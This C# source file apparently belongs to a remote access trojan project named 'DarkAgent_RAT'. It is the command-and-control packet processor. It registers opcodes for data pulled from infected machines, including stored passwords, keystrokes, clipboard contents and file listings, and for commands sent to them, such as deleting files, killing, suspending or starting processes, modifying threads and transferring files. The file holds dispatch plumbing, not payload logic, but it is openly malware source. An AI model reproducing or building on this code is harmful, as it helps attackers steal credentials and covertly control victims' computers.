using System;
using System.Collections.Generic;
using System.Text;
using DarkAgent_RAT.src.Network.DataNetwork.Packets.Receive;
using System.Net.Sockets;
using DarkAgent_RAT.src.Utils;

namespace DarkAgent_RAT.src.Network.DataNetwork.Packets
{
    class ClientPacketProcessor
    {
        private static SortedList<short, PacketType> packetList;
        private static SortedList<short, PacketType> OutgoingpacketList;


        public static void Initialize()
        {
            packetList = new SortedList<short, PacketType>();
            OutgoingpacketList = new SortedList<short, PacketType>();

            RegisterPacket(new PacketType("New Client",             0x0000, typeof(R_NewClient)));
            RegisterPacket(new PacketType("Get Processes",          0x0001, typeof(R_GetProcesses)));
            RegisterPacket(new PacketType("Get Processes DLLs",     0x0002, typeof(R_GetProcessDLLs)));
            RegisterPacket(new PacketType("Get Process Threads",    0x0003, typeof(R_GetProcessThreads)));
            RegisterPacket(new PacketType("FileMgr Get Drives",     0x0004, typeof(R_FileMgrDrives)));
            RegisterPacket(new PacketType("FileMgr GetFolders",     0x0005, typeof(R_FileMgrGetFolders)));
            RegisterPacket(new PacketType("FileMgr GetFiles",       0x0006, typeof(R_FileMgrGetFiles)));
            RegisterPacket(new PacketType("Get Cpu Info",           0x0007, typeof(R_GetCpuInfo)));
            RegisterPacket(new PacketType("Get Passwords",          0x0008, typeof(R_GetPasswords)));
            RegisterPacket(new PacketType("Get KeyStrokes",         0x0009, typeof(R_KeyStrokes)));
            RegisterPacket(new PacketType("Get Clipboard",          0x0010, typeof(R_GetClipboard)));
            RegisterPacket(new PacketType("Get FileServer RemoteIP",0x0011, typeof(R_RemoteIP)));

            RegisterOutgoingPacket(new PacketType("MesageBox", 0x0000, null));
            RegisterOutgoingPacket(new PacketType("Cursor Position", 0x0001, null));
            RegisterOutgoingPacket(new PacketType("Delete File", 0x0002, null));
            RegisterOutgoingPacket(new PacketType("Get Processes", 0x0003, null));
            RegisterOutgoingPacket(new PacketType("Kill Process", 0x0004, null));
            RegisterOutgoingPacket(new PacketType("Suspend Process", 0x0005, null));
            RegisterOutgoingPacket(new PacketType("Resume Process", 0x0006, null));
            RegisterOutgoingPacket(new PacketType("Change Window text", 0x0007, null));
            RegisterOutgoingPacket(new PacketType("Get Process DLLs", 0x0008, null));
            RegisterOutgoingPacket(new PacketType("Process Threads", 0x0009, null));
            RegisterOutgoingPacket(new PacketType("Mod Thread", 0x0010, null));
            RegisterOutgoingPacket(new PacketType("Start Process", 0x0011, null));
            RegisterOutgoingPacket(new PacketType("FileMgr GetDrives", 0x0012, null));
            RegisterOutgoingPacket(new PacketType("FileMgr GetFiles", 0x0013, null));
            RegisterOutgoingPacket(new PacketType("Send File bytes", 0x0014, null));
            RegisterOutgoingPacket(new PacketType("FileMgr GetDrives", 0x0015, null));
            RegisterOutgoingPacket(new PacketType("Filetransfer completed", 0x0016, null));

       }

        private static void RegisterPacket(PacketType packet)
        {
            Logger.AddLog(new LogInfo("New packet registered", "Opcode: " + packet.Opcode.ToString("x4") + " Name: " + packet.Name));
            packetList.Add(packet.Opcode, packet);
        }

        private static void RegisterOutgoingPacket(PacketType packet)
        {
            Logger.AddLog(new LogInfo("New packet registered", "Opcode: " + packet.Opcode.ToString("x4") + " Name: " + packet.Name));
            OutgoingpacketList.Add(packet.Opcode, packet);
        }

        public static string GetOutgoingPacket(byte PacketId)
        {
            if (OutgoingpacketList.ContainsKey((short)PacketId))
                return OutgoingpacketList[(short)PacketId].Name;
            else
                return "Unknown";
        }

        public static Type ProcessPacket(byte[] packet, string IP)
        {
            if (packetList.ContainsKey((short)packet[0]))
                return packetList[(short)packet[0]].Packet;
            return null;
        }

        private class PacketType
        {
            public string Name { get; private set; }
            public short Opcode { get; private set; }
            public Type Packet { get; private set; }

            public PacketType(string name, short opcode, Type packet)
            {
                Name = name;
                Opcode = opcode;
                Packet = packet;
            }
        }
    }
}
